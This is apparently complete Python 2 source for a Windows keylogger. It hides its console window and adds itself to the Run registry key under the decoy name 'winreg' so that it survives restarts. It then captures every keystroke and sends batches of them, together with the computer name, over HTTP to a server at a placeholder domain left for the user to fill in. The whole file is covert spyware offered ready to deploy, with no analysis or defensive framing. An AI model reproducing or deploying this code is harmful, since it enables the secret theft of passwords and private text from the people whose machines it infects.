import win32console, win32gui,pythoncom, pyHook, os, urllib, httplib, sys, win32event, win32api, winerror
from _winreg import *
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
stroke = ''


mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

def addStartup():
    fp=os.path.dirname(os.path.realpath("__file__"))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "winreg",0,REG_SZ, new_file_path)



def OnKeyboardEvent(event):
    global stroke
    if event.Ascii != 0:
        log = chr(event.Ascii)
        if event.Ascii == 8:
            log = '[bs]'
        stroke += log
        if len(stroke) >= 100:
            line = urllib.urlencode({'pcName': os.environ['COMPUTERNAME'], 'toLog': stroke[-111:]})
            connection = httplib.HTTPConnection("YOUR_DOMAIN_NAME")     #YOUR DOMAIN NAME
            connection.request("GET", "/index.php?" + line)
            stroke = ''


addStartup()
man = pyHook.HookManager()
man.KeyDown = OnKeyboardEvent
man.HookKeyboard()
pythoncom.PumpMessages()
